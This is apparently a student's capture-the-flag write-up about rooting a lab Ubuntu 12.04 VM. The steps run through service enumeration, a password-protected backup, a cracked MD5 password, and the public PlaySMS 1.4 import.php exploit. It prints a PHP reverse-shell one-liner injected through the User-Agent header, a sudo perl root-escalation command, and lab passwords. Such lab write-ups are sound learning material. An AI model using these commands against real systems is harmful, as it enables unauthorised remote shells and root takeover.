# Challenge 1 - Gain Access to a Remote Server

## Info Gathering

Ubuntu 12.04 LTS
![lightdm](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_05_01_2024_10_12_36.png)

Finding more info and most importantly ip address and open ports.
![ip](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_05_01_2024_10_23_31.png)
```uname -a``` output : ```Linux hackme 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux```

Got the kernel, I am not sure if I can use it for vulnerabilities.

Ip Address : ```192.168.42.13```

Port 80.

Found out that port 3306 is default port for MySQL. Found out this ```[ï¿½ï¿½ï¿½
5.5.54-0ubuntu0.12.04.1ï¿½$ï¿½ï¿½ï¿½W>p:l7h(ï¿½Ã¿Ã·ï¿½â‚¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½*=2%`723GL'{ï¿½mysql_native_passwordï¿½!ï¿½ï¿½Ã¿â€ž#08S01Got packets out of order```

![mysql](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_05_01_2024_10_26_07.png)

```5.5.54``` might be the version of it. idk, will see later.

Confirmed.

Now since I have the Ip, lets nmap and find something else if I can.
![nmap](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-05%2010-57-13.png)
```Apache 2.2.22```

## Finding Vulnerabilities

Now as I have all info I can gather, I can now start some web surfing part.

With ```OPTIONS``` method I can see allowed methods. ie. GET,HEAD,POST,HEAD. Will see if it is of any use.
![options](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-05%2011-20-16.png)

Missed checking the php version earlier, here it is.
![php](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-05%2012-00-24.png)

And the good part, seems like PHP version ```5.3.10``` has some vulnerability :)

Lets see how can I exploit this.

Btw I also tried finding vuln  in Apache server, cant find much (or maybe couldnt understand).

## Update on Vuln 

After trying many things I almost gave up on finding vulnerabilities.

So I started to find what can I do with the GUEST user and with what I have. 

![whatcaniaccess](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_11_01_2024_14_51_54.png)

Found all website content. Clearly I can see that theres something more than what I got in ```robots.txt```.

Found this : 

![secret](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_05_01_2024_15_07_17.png)

And I went straight to logging in SAIC user, but this isnt it ðŸ˜‚ðŸ˜‚, 

Lol, later found ```/secure/backup.zip```. Password came in use here. Password was ```freedom```. 

Got something, lets see where it comes in use :

![backup](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2015-04-07.png)

So, this is what I was supposed to do with that username.

![sms](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2015-06-25.png)

After banging my head on the wall multiple times, I found that password for playSMS is ```diana```. But my stupid mind thought that the ```secret.txt``` was jsut one time pass. ðŸ˜‚ðŸ˜­ðŸ˜­

So lemme share what I did for finding the password.

Found password for that from ```/var/www/SecreTSMSgatewayLogin/congig.php``` :

![database](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_05_01_2024_15_22_17.png)

Logging in : 

![login](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/VirtualBox_saic_11_01_2024_18_57_08.png)

In the database I found 2 users :

Did reverse md5 for password, got ```diana```.

### Finding Vulnerability for playSMS.

Found this : [PlaySMS 1.4 - 'import.php' Remote Code Execution ](https://www.exploit-db.com/exploits/42044)

Followed to his video tutorial : 

![video](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2019-18-39.png)

It took me to DINA 1.0.1

![dina](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2019-20-42.png)

Not its obvious that some googling would solve it. Took some help from here and there.

Put this ```php -r '$sock=fsockopen("192.168.42.11",4444);exec("/bin/sh -i <&3 >&3 2>&3");'``` in user agent as suggested here : https://www.exploit-db.com/exploits/42044

While listning on nc, got reverse shell, still not root access btw.

![revshell](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2019-30-55.png)

Got command from getting root access from a youtube video : ```sudo /usr/bin/perl -e 'exec ("/bin/bash");'```

![vid](https://github.com/nandan645/SysAdmin/blob/main/PS1_Ova/Screenshot%20from%202024-01-11%2019-34-23.png)

After this, it was pretty simple, got the flag.

Yayy !
